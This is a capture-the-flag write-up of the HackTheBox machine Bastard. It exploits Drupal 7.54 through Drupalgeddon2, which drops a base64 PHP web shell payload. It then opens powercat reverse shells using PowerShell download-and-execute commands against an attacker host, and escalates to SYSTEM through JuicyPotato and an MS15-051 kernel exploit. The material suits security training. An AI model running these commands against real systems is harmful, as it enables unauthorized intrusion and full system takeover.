---
render_with_liquid: false
title: HackTheBox Writeup  Bastard
date: 2024-01-19 20:28:34 +1400
tags: [hackthebox, nmap, windows, feroxbuster, drupal, drupalgeddon2, powercat, privilege-token, juicy-potato, wesng, ms15-051, kernel-exploit]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard]
└─$ pt init '10.129.54.13 Bastard'
+---------+--------+--------------+---------+
| PROFILE | STATUS |      IP      | DOMAIN  |
+---------+--------+--------------+---------+
| bastard | on     | 10.129.54.13 | Bastard |
+---------+--------+--------------+---------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Jan 19 20:28:34 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,135,49154, Bastard
Nmap scan report for Bastard (10.129.54.13)
Host is up, received user-set (0.18s latency).
Scanned at 2024-01-19 20:28:34 CST for 78s

PORT      STATE SERVICE REASON          VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jan 19 20:29:52 2024 -- 1 IP address (1 host up) scanned in 77.69 seconds
```

## 80 - HTTP : Bastard (Drupal)


### Info

![](/assets/obsidian/9db1cb88e4cf28784d157bb6a1e87a3b.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard]
└─$ feroxbuster -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -C 400,404,500 -u 'http://Bastard/' -o ferox_80.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://Bastard/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       44l      290w     1874c http://bastard/INSTALL.pgsql.txt
200      GET       31l      209w     1298c http://bastard/INSTALL.sqlite.txt
200      GET       45l      262w     1717c http://bastard/INSTALL.mysql.txt
200      GET      246l     1501w    10123c http://bastard/UPGRADE.txt
200      GET      307l      846w     8710c http://bastard/MAINTAINERS.txt
200      GET      339l     2968w    18092c http://bastard/LICENSE.txt
200      GET      400l     2475w    17995c http://bastard/INSTALL.txt
200      GET     2284l    16004w   110781c http://bastard/CHANGELOG.txt
403      GET       29l       92w     1233c http://bastard/update.php
200      GET      146l      368w     7027c http://bastard/user/password
403      GET       29l       92w     1233c http://bastard/admin
200      GET        1l        6w       42c http://bastard/xmlrpc.php
200      GET       59l      173w     3088c http://bastard/install.php
403      GET       29l       92w     1233c http://bastard/node/add
200      GET      152l      395w     7377c http://bastard/user/login
403      GET       29l       92w     1233c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l       35w    11296c http://bastard/misc/favicon.ico
200      GET      159l      413w     7508c http://bastard/0
200      GET       79l      473w     2974c http://bastard/misc/jquery.once.js
200      GET       19l       96w     6274c http://bastard/themes/bartik/logo.png
200      GET      525l     2481w    17588c http://bastard/misc/drupal.js
200      GET      168l     1309w    78602c http://bastard/misc/jquery.js
200      GET      159l      413w     7508c http://bastard/
301      GET        2l       10w      143c http://bastard/Misc => http://bastard/Misc/
301      GET        2l       10w      146c http://bastard/Scripts => http://bastard/Scripts/
301      GET        2l       10w      144c http://bastard/Sites => http://bastard/Sites/
301      GET        2l       10w      145c http://bastard/Themes => http://bastard/Themes/
301      GET        2l       10w      147c http://bastard/includes => http://bastard/includes/
301      GET        2l       10w      143c http://bastard/misc => http://bastard/misc/
301      GET        2l       10w      146c http://bastard/modules => http://bastard/modules/
301      GET        2l       10w      147c http://bastard/profiles => http://bastard/profiles/
200      GET       90l      243w     2189c http://bastard/robots.txt
301      GET        2l       10w      146c http://bastard/scripts => http://bastard/scripts/
301      GET        2l       10w      144c http://bastard/sites => http://bastard/sites/
301      GET        2l       10w      145c http://bastard/themes => http://bastard/themes/
[####################] - 11m     4794/4794    0s      found:34      errors:4633
[####################] - 11m     4724/4724    7/s     http://Bastard/ 
```


# User Flag
---

## Shell as nt authority iusr

### Drupal 7.54 - Drupalgeddon2 RCE

Drupal's version is `7.54`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard]
└─$ curl http://bastard/CHANGELOG.txt -s | head

Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
```

Google : `Drupal 7.54 exploit`

> https://www.exploit-db.com/exploits/44449

This exploit will test for various RCE methods fir these versions : `Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard/exploit]
└─$ searchsploit -m 44449
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/htb/Bastard/exploit/44449.rb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard/exploit]
└─$ proxychains -f ~/configs/proxychains/burp.conf -q ruby ./44449.rb http://bastard
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://bastard/
--------------------------------------------------------------------------------
[+] Found  : http://bastard/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo YNQMAFMN
[+] Result : YNQMAFMN
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://bastard/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Existing file   (http://bastard/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Existing file   (http://bastard/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
```

Got RCE by using `HTML markup` to execute PHP code

![](/assets/obsidian/ed4b200e7cdfa9a6a536d7ab31d5071d.png)

It will generate a form ID in this format : `value="form-<ID>"`

![](/assets/obsidian/52dcddbeb263780a81f8813bcfc1d99e.png)

Use the form ID to execute and view the result of command execution 

![](/assets/obsidian/d58411f07c0899b4de60d5088a1746b1.png)

### Reverse shell

```bash
mkdir -p www/ && cd www
cp /opt/sectools/powershell/powercat/powercat.ps1 ./rev.ps1
echo 'powercat -c 10.10.14.21 -p 1111 -ep' >> rev.ps1
python -m http.server 80
```

```bash
drupalgeddon2>> powershell -ep bypass -nop iex (new-object system.net.webclient).downloadstring('http://10.10.14.21/rev.ps1')
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard/exploit]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.54.13] 60366
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

PS C:\inetpub\drupal-7.54> ls \users\ -Include user.txt -Recurse


    Directory: C:\users\dimitris\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-ar--         19/1/2024  11:00 ??         34 user.txt

PS C:\inetpub\drupal-7.54> cat C:\Users\dimitris\Desktop\user.txt
c3d87ebc350ac93c85bffe50e7e12698
```

# Root Flag
---

## From nt authority iusr to nt authority SYSTEM


### Abuse privilege tokens

`iusr` have `SeImpersonatePrivilege` privilege token, which can be used for potato attacks

```bash
PS C:\inetpub\drupal-7.54> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

> **JuicyPotatoNG** didn't work on this old windows machine, use original **JuicyPotato** instead
{: .prompt-info }

**JuicyPotato** shows `COM -> recv failed with error: 10038`, that was because the default CLSID was invalid for this windows version

```bash
PS C:\inetpub\drupal-7.54> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.21/win/JuicyPotato.exe', '\programdata\j.exe')

PS C:\inetpub\drupal-7.54> C:\ProgramData\j.exe -t * -l 1431 -p cmd.exe -a "/c powershell -ep bypass -nop iex (new-object system.net.webclient).downloadstring('http://10.10.14.21/rev.ps1')"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1431
COM -> recv failed with error: 10038
```

We're on `Windows Server 2008 R2 Datacenter`

```bash
PS C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          19/1/2024, 10:59:12 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.319 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.246 MB
Virtual Memory: In Use:    849 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.54.13
```

> **Script to find CLSID**
> Use [`GetCLSID.ps1`](https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1) to auto find CLSID if the environment allows it
{: .prompt-tip }

There's a list of CLSID for windows versions

> https://ohpe.it/juicy-potato/CLSID/

Pick one CLSID from below list

> https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/

The second one worked

![](/assets/obsidian/a667a25224c1fb321c6c0b5e08b9fcf9.png)

```bash
PS C:\inetpub\drupal-7.54> C:\ProgramData\j.exe -t * -l 1431 -p cmd.exe -a "/c powershell -ep bypass -nop iex (new-object system.net.webclient).downloadstring('http://10.10.14.21/rev.ps1')" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1431
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.54.13] 60622
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\users\administrator\desktop\root.txt
b9bc3eedbf650aa6763984a3d2912cbe
PS C:\Windows\system32>
```


# Additional
---

## Privilege escalation - Kernel exploit (ms15-051)


### Wesng

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/privesc/wesng]
└─$ python wes.py /home/kali/htb/Bastard/systeminfo.txt --impact "Elevation of Privilege" -e
Windows Exploit Suggester 1.04 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2008 R2 for x64-based Systems
    - Generation: 2008 R2
    - Build: 7600
    - Version: None
    - Architecture: x64-based
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20240112
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[!] Found vulnerabilities!

Date: 20110208
CVE: CVE-2010-4398
KB: KB2393802
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploits: http://www.exploit-db.com/bypassing-uac-with-user-privilege-under-windows-vista7-mirror/, http://www.exploit-db.com/exploits/15609/

Date: 20130108
CVE: CVE-2013-0008
KB: KB2778930
Title: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploit: http://www.exploit-db.com/exploits/24485

Date: 20120612
CVE: CVE-2012-0217
KB: KB2709715
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/28718/, https://www.exploit-db.com/exploits/46508/

[-] Missing patches: 3
    - KB2393802: patches 1 vulnerability
    - KB2778930: patches 1 vulnerability
    - KB2709715: patches 1 vulnerability
[I] KB with the most recent release date
    - ID: KB2778930
    - Release date: 20130108
[+] Done. Displaying 3 of the 207 vulnerabilities found.
```

Wesng didn't give a good result

### Windows precompiled kernel exploits

> [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

Search `2012` and prior the ones with `kernel` keyword

This worked - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

```bash
PS C:\inetpub\drupal-7.54> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.21/win/ms15-051.exe', '\programdata\ms15-051.exe')
PS C:\inetpub\drupal-7.54> \programdata\ms15-051.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 4444 created.
==============================
nt authority\system
PS C:\inetpub\drupal-7.54>
```

Reverse shell

```bash
PS C:\inetpub\drupal-7.54> \programdata\ms15-051.exe "powershell -ep bypass -nop iex (new-object system.net.webclient).downloadstring('http://10.10.14.21/rev.ps1')"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bastard]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.54.13] 60896
Windows PowerShell
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54> whoami
nt authority\system
```